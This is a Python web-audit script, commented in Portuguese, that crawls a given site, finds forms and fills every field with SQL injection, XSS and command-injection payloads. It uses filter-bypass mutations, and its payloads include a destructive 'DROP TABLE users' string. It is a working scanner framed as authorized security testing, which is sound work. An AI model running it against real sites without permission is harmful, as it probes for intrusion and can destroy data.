#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ferramenta avançada e extensível para auditoria de segurança em sites.
Este código inclui:
 - Mapeamento de URLs e formulários
 - Validação de entradas
 - Injeção de payloads com mutações avançadas
 - Análise de respostas do servidor
 - Logs e relatórios em formatos configuráveis

Uso estritamente autorizado e ético.
"""

import requests
from bs4 import BeautifulSoup
import re
import json
import time
from urllib.parse import urlparse, urljoin

# ---------------------------------------------------------
# CONFIGURAÇÕES E SESSÃO
# ---------------------------------------------------------
class Config:
    HEADERS = {
        "User-Agent": "SecAuditor/2.0"
    }
    MAX_DEPTH = 3
    TIMEOUT = 10
    USE_PROXY = False
    PROXY = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    REPORT_FORMATS = ["html", "json"]

def criar_sessao():
    sess = requests.Session()
    sess.headers.update(Config.HEADERS)
    if Config.USE_PROXY:
        sess.proxies.update(Config.PROXY)
    return sess

# ---------------------------------------------------------
# MAPEAMENTO DO SITE
# ---------------------------------------------------------
class SiteMapper:
    def __init__(self, base_url, sess=None):
        self.base_url = base_url
        self.session = sess if sess else criar_sessao()
        self.visited = set()
        self.forms = []
        self.internal_urls = []

    def _is_internal_url(self, url):
        domain_base = urlparse(self.base_url).netloc
        domain_target = urlparse(url).netloc
        return domain_base == domain_target or domain_target == ""

    def _coletar_formularios(self, url, soup):
        for form in soup.find_all("form"):
            method = form.get("method", "GET").upper()
            action = form.get("action", "")
            action = urljoin(url, action)
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                ttype = inp.get("type", "text")
                inputs.append((name, ttype))
            self.forms.append({
                "url": url,
                "action": action,
                "method": method,
                "inputs": inputs
            })

    def _coletar_links(self, url, soup):
        found_urls = []
        for tag in soup.find_all("a"):
            href = tag.get("href")
            if href:
                full_url = urljoin(url, href)
                found_urls.append(full_url)
        return found_urls

    def mapear(self, url=None, depth=0):
        if not url:
            url = self.base_url

        if url in self.visited or depth > Config.MAX_DEPTH:
            return

        try:
            resp = self.session.get(url, timeout=Config.TIMEOUT)
        except Exception:
            return

        self.visited.add(url)

        if resp.status_code != 200:
            return

        soup = BeautifulSoup(resp.text, "lxml")

        self._coletar_formularios(url, soup)
        links_encontrados = self._coletar_links(url, soup)
        for link in links_encontrados:
            if link not in self.internal_urls and self._is_internal_url(link):
                self.internal_urls.append(link)

        for link in links_encontrados:
            if self._is_internal_url(link):
                self.mapear(link, depth + 1)

    def resultado(self):
        return {
            "visited_urls": list(self.visited),
            "forms": self.forms,
            "internal_urls": self.internal_urls
        }

# ---------------------------------------------------------
# VALIDAÇÃO E INSPEÇÃO DE ENTRADAS
# ---------------------------------------------------------
class InputInspector:
    @staticmethod
    def detectar_tipo_campo(nome_campo, tipo_html):
        tipo_html = tipo_html.lower()
        if "email" in tipo_html:
            return "email"
        elif "file" in tipo_html:
            return "file"
        elif "hidden" in tipo_html:
            return "hidden"
        elif "number" in tipo_html:
            return "number"
        return "text"

    @staticmethod
    def analisar(forms):
        for f in forms:
            for (n, t) in f["inputs"]:
                detected = InputInspector.detectar_tipo_campo(n, t)
                f.setdefault("detected_types", []).append((n, detected))
        return forms

# ---------------------------------------------------------
# GERAÇÃO DE PAYLOADS E MUTAÇÕES
# ---------------------------------------------------------
class PayloadGenerator:
    """
    Abordagem para criação e mutação avançada de payloads, aumentando a
    probabilidade de bypass de filtros.
    """

    BASE_PAYLOADS = {
        "SQLi": [
            "' OR 1=1 --",
            "' UNION SELECT null --",
            "'; DROP TABLE users; --"
        ],
        "XSS": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ],
        "CMDi": [
            "&& uname -a",
            "; ls -la",
            "| whoami"
        ]
    }

    @staticmethod
    def gerar_payloads_teste(categorias=None):
        if not categorias:
            categorias = ["SQLi", "XSS", "CMDi"]
        escolhidos = {}
        for cat in categorias:
            escolhidos[cat] = PayloadGenerator.BASE_PAYLOADS.get(cat, [])
        return escolhidos

    @staticmethod
    def mutar_payloads(payload):
        """
        Implementa vários tipos de mutações:
        1. Codificações (URL-encoding)
        2. Inserção de comentários
        3. Troca de aspas por equivalentes
        4. Inserção de caracteres/unicode especiais
        """
        mutations = set()
        
        # Mutações simples
        url_encoded = payload.replace(" ", "%20").replace("'", "%27")
        comentado = re.sub(r"\s", "/**/", payload)
        aspas_duplas = payload.replace("'", "\"")
        unicode_trick = payload.replace(" ", "\u00A0")  # espaço "invisível"

        mutations.add(url_encoded)
        mutations.add(comentado)
        mutations.add(aspas_duplas)
        mutations.add(unicode_trick)

        # Varredura de caracteres substituindo ' por combinações (e.g., `%27`, `&#39;`)
        substitutions = [
            ("%27", "&#39;", "'"),
            ("%22", "&#34;", "\""),
        ]
        for combo in substitutions:
            for sub in combo:
                mutated = payload.replace("'", sub)
                mutations.add(mutated)

        # Exemplo de inserção de SQL comments em payloads
        mutations.add(f"{payload}--")

        # Retorna todas as mutações geradas (removendo duplicados)
        return list(mutations)

# ---------------------------------------------------------
# TESTE DE INJEÇÃO E INTERPRETAÇÃO DE RESPOSTAS
# ---------------------------------------------------------
class Injector:
    def __init__(self, sess=None):
        self.session = sess if sess else criar_sessao()
        self.logs = []

    def testar_formulario(self, form_info, data_send):
        action = form_info["action"]
        metodo = form_info["method"]

        try:
            if metodo == "POST":
                resp = self.session.post(action, data=data_send, timeout=Config.TIMEOUT)
            else:
                resp = self.session.get(action, params=data_send, timeout=Config.TIMEOUT)
        except Exception as e:
            self.logs.append({
                "target": action,
                "method": metodo,
                "error": str(e)
            })
            return None

        return resp

    def analisar_resposta(self, resp, payload):
        resultado = {
            "status_code": resp.status_code,
            "suspeita": False,
            "indicacao": ""
        }
        conteudo = resp.text.lower()

        # Exemplo simplificado de detecção de SQLi
        if "syntax error" in conteudo or "sql" in conteudo:
            resultado["suspeita"] = True
            resultado["indicacao"] += "Possível SQL Injection"

        # Exemplo simples de detecção de XSS
        if payload.lower() in conteudo:
            if resultado["suspeita"]:
                resultado["indicacao"] += " | "
            resultado["suspeita"] = True
            resultado["indicacao"] += "Possível XSS"

        return resultado

    def executar_testes_injecao(self, forms_encontrados, payloads_config):
        for idx_form, form_info in enumerate(forms_encontrados):
            for cat, plist in payloads_config.items():
                for pay in plist:
                    # Gera mutações para cada payload
                    variantes = [pay] + PayloadGenerator.mutar_payloads(pay)

                    for variant in variantes:
                        data_send = {}
                        for (n, _t) in form_info["inputs"]:
                            if n:
                                data_send[n] = variant

                        resp = self.testar_formulario(form_info, data_send)
                        if resp:
                            analise = self.analisar_resposta(resp, variant)
                            self.logs.append({
                                "form_index": idx_form,
                                "action": form_info["action"],
                                "payload": variant,
                                "categoria": cat,
                                "status_code": analise["status_code"],
                                "suspeita": analise["suspeita"],
                                "indicacao": analise["indicacao"]
                            })

# ---------------------------------------------------------
# LOGS E RELATÓRIOS
# ---------------------------------------------------------
class ReportManager:
    @staticmethod
    def gerar_relatorio_json(arquivo, logs):
        with open(arquivo, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)

    @staticmethod
    def gerar_relatorio_html(arquivo, logs):
        inicio = "<html><head><meta charset='utf-8'><title>Relatório</title></head><body>"
        fim = "</body></html>"
        conteudo = [inicio, "<h1>Relatório de Auditoria</h1>", "<ul>"]
        for item in logs:
            li = f"<li>Form #{item['form_index']} - {item['action']}<br>"
            li += f"Payload: {item['payload']}<br>"
            li += f"Status: {item['status_code']}<br>"
            if item['suspeita']:
                li += f"Susp.: {item['indicacao']}"
            li += "</li><br>"
            conteudo.append(li)
        conteudo.append("</ul>")
        conteudo.append(fim)
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write("\n".join(conteudo))

# ---------------------------------------------------------
# FUNÇÃO PRINCIPAL
# ---------------------------------------------------------
def main():
    base_url = input("Digite a URL base para auditoria (ex: http://localhost): ").strip()
    print("[*] Iniciando mapeamento do site...")

    mapper = SiteMapper(base_url=base_url)
    mapper.mapear()
    resultado_map = mapper.resultado()

    print(f"[+] URLs mapeadas: {len(resultado_map['visited_urls'])}")
    print(f"[+] Formulários encontrados: {len(resultado_map['forms'])}")

    forms_analisados = InputInspector.analisar(resultado_map["forms"])

    payloads_categorias = PayloadGenerator.gerar_payloads_teste(["SQLi", "XSS", "CMDi"])

    injector = Injector()
    injector.executar_testes_injecao(forms_analisados, payloads_categorias)

    logs = injector.logs
    print(f"[+] Testes de injeção concluídos. Total de entradas registradas: {len(logs)}")

    timestamp = int(time.time())
    if "json" in Config.REPORT_FORMATS:
        ReportManager.gerar_relatorio_json(f"relatorio_{timestamp}.json", logs)
        print("[+] Relatório JSON gerado.")
    if "html" in Config.REPORT_FORMATS:
        ReportManager.gerar_relatorio_html(f"relatorio_{timestamp}.html", logs)
        print("[+] Relatório HTML gerado.")

    print("[*] Auditoria finalizada.")

if __name__ == "__main__":
    main()
